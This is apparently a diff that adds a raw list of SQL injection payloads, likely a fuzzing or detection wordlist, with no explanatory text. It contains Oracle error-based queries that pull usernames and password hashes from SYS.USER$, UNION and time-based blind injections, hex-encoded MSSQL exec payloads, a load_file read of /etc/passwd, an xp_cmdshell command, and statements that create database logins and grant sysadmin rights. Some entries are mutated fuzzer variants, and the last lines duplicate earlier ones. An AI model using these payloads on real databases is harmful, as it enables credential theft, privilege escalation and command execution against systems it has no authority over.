@@ -1,0 +1,100 @@
+x' and 1 =  ( select count ( * )  from tabname ) 
+x' and members.email is NULL
+x' or full_name like '%bob%
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT banner FROM v$version WHERE ROWNUM = 1  )  )   AND 'i' = 'i
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT SYS.LOGIN_USER FROM DUAL  )  )   AND 'i' = 'i
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT SYS.DATABASE_NAME FROM DUAL  )  )   AND 'i' = 'i
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT host_name FROM v$instance  )  )   AND 'i' = 'i
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT global_name FROM global_name  )  )   AND 'i' = 'i
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( USERNAME  )  )   FROM SYS.ALL_USERS  )  )   AND 'i' = 'i
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( PASSWORD  )  )   FROM SYS.USER$  )  )   AND 'i' = 'i
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( table_name  )  )   FROM sys.all_tables  )  )   AND 'i' = 'i
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( column_name  )  )   FROM sys.all_tab_columns  )  )   AND 'i' = 'i
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( GRANTED_ROLE  )  )   FROM DBA_ROLE_PRIVS WHERE GRANTEE = SYS.LOGIN_USER  )  )   AND 'i' = 'i
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 1  )  )   AND 'i' = 'i"
+" select * from users where id = '1' or $ 1 = 1 union select 1,@@VERSION -- 1'"
+ select * from users where id = '1' or $<\ or 1 = 1 -- 1'
+" select * from users where id = '1' or $<\. union select 1,@@VERSION -- 1'"
+" select * from users where id = '1' or $<\ union select 1,@@VERSION -- 1'"
+" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'"
+ select * from users where id = '1' or \<\. or 1 = 1 -- 1'
+" select * from users where id = '1' or \<\. union select 1,@@VERSION -- 1'"
+ select * from users where id = '1' or \<1 or 1 = 1 -- 1'
+" select * from users where id = '1' or !<1 union select 1,version (  )  -- 1'"
+" select * from users where id = '1' or \<\ union select 1,@@VERSION -- 1'"
+ select * from users where id = '1' or \<$ or 1 = 1 -- 1'
+" select * from users where id = '1' or \<$ union select 1,@@VERSION -- 1'"
+" select * from users where id = '1' or \<  = 1 union select 1,@@VERSION -- 1'"
+ select * from users where id = '1' or !<@ or 1 = 1 -- 1'
+" select * from users where id = '1' or !<@ union select 1,version (  )  -- 1'"
+" select * from users where id = '1' or @ ( 1 )  = 1 union select 1,version (  )  -- 1'"
+" select * from users where id = '1' or @ 1 = 1 union select 1,version (  )  -- 1'"
+" select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'"
+" select * from users where id = 1 or "" (  ) "" or 1 = 1 -- 1"
+" select * from users where id = 1 or "" ( ,"" = 1 or 1 = 1 -- 1"
+" select * from users where id = 1 or "" ( ."" or 1 = 1 -- 1"
+" select * from users where id = 1 or "" ( 1"" or 1 = 1 -- 1"
+" select * from users where id = 1 or 1#"" (  union select null,version (  )  -- 1"
+" select * from users where id = 1 or "" ( #"" or 1 = 1 -- 1"
+" select * from users where id = 1 or "" ( ["" or 1 = 1 -- 1"
+" select * from users where id = 1 or "" ( _"" or 1 = 1 -- 1"
+" select * from users where id = 1 or @#"" (  = 1 or 1 = 1 -- 1"
+" select * from users where id = 1 or @#"" (  = 1 union select 1,version (  )  -- 1"
+" select * from users where id = 1 or "" ( &"" or 1 = 1 -- 1"
+" select * from users where id = 1 or "" ( @"" or 1 = 1 -- 1"
+" select * from users where id = 1 or "" ( {"" or 1 = 1 -- 1"
+" select * from users where id = 1 or "" )  ( "" = 1 or 1 = 1 -- 1"
+" select * from users where id = 1 or "";]"" or 1 = 1 -- 1"
+" select * from users where id = 1 or 1#""; union select 1,version (  )  -- 1"
+" select * from users where id = 1 or 1#""; union select version (  ) ,version (  )  -- 1"
+" select * from users where id = 1 or 1#""; union select 'a',version (  )  -- 1"
+" select * from users where id = 1 or 1#""; union select null,version (  )  -- 1"
+" select * from users where id = 1 or "";#"" or 1 = 1 -- 1"
+" select * from users where id = 1 or "";["" or 1 = 1 -- 1"
+" select * from users where id = 1 or "";_"" or 1 = 1 -- 1"
+" select * from users where id = 1 or @#""; = 1 or 1 = 1 -- 1"
+" select * from users where id = 1 or 1#""; = 1 union select 1,version (  )  -- 1"
+" select * from users where id = 1 or "";&"" or 1 = 1 -- 1"
+" select * from users where id = '1' union select "";""_,version (  )  -- 1'"
+"1234 ' AND 1 = 0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055"
+" union select 1,load_file ( '/etc/passwd' ) ,1,1,1;"
+t'exec master..xp_cmdshell 'nslookup www.googl ...
+declare @q nvarchar  ( 200 )  select @q  =  0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec ( @q ) 
+declare @s varchar ( 200 )  select @s  =  0x77616974666F722064656C61792027303A303A31302700 exec ( @s )  
+declare @q nvarchar  ( 200 )  0x730065006c00650063007400200040004000760065007200730069006f006e00 exec ( @q ) 
+declare @s varchar  ( 200 )  select @s  =  0x73656c65637420404076657273696f6e exec ( @s ) 
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 6  )  )   AND 'i' = 'i"
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 6  )  )   AND 'i' = 'i"
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 6  )  )   AND 'i' = 'i"
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 6  )  )   AND 'i' = 'i"
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 6  )  )   AND 'i' = 'i"
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 7  )  )   AND 'i' = 'i"
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 7  )  )   AND 'i' = 'i"
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 7  )  )   AND 'i' = 'i"
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 7  )  )   AND 'i' = 'i"
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 7  )  )   AND 'i' = 'i"
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 8  )  )   AND 'i' = 'i"
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 8  )  )   AND 'i' = 'i"
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 8  )  )   AND 'i' = 'i"
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 8  )  )   AND 'i' = 'i"
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 8  )  )   AND 'i' = 'i"
+"'|| ( elt ( -3+5,bin ( 15 ) ,ord ( 10 ) ,hex ( char ( 45  )  )    )  )  "
+"1 and ascii ( lower ( substring  (  (  select top 1 name from sysobjects where xtype = 'u' ) , 1, 1  )  )   )  > 116"
+"' union  ( select NULL,  ( select @@version  )  )   --"
+"' union  ( select NULL, NULL,  ( select @@version  )  )   --"
+"' union  ( select NULL, NULL, NULL,   ( select @@version  )  )   --"
+"' union  ( select NULL, NULL, NULL, NULL,   ( select @@version  )  )   --"
+"' union  ( select NULL, NULL, NULL, NULL,  NULL,  ( select @@version  )  )   --"
+"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 0 )  waitfor delay '0:0:2' --"
+"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 5 )  waitfor delay '0:0:2' --"
+"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 8 )  waitfor delay '0:0:2' --"
+"'; if not ( substring  (  (  select @@version ) ,24,1 )  <> 1 )  waitfor delay '0:0:2' --"
+"exec sp_addlogin 'name' , 'password'"
+"exec sp_addsrvrolemember 'name' , 'sysadmin'"
+"insert into mysql.user  ( user, host, password )  values  ( 'name', 'localhost', password ( 'pass123'  )  )  "
+"insert into users ( login, password, level )  values (  char ( 0x70 )  + char ( 0x65 )  + char ( 0x74 )  + char ( 0x65 )  + char ( 0x72 )  + char ( 0x70 )  + char ( 0x65 )  + char ( 0x74 )  + char ( 0x65 )  + char ( 0x72 ) ,char ( 0x64 ) "
+ select * from users where id = '1' or !<@ or 1 = 1 -- 1'
+" select * from users where id = '1' or !<@ union select 1,version (  )  -- 1'"
+" select * from users where id = '1' or @ ( 1 )  = 1 union select 1,version (  )  -- 1'"
+" select * from users where id = '1' or @ 1 = 1 union select 1,version (  )  -- 1'"
+" select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'"
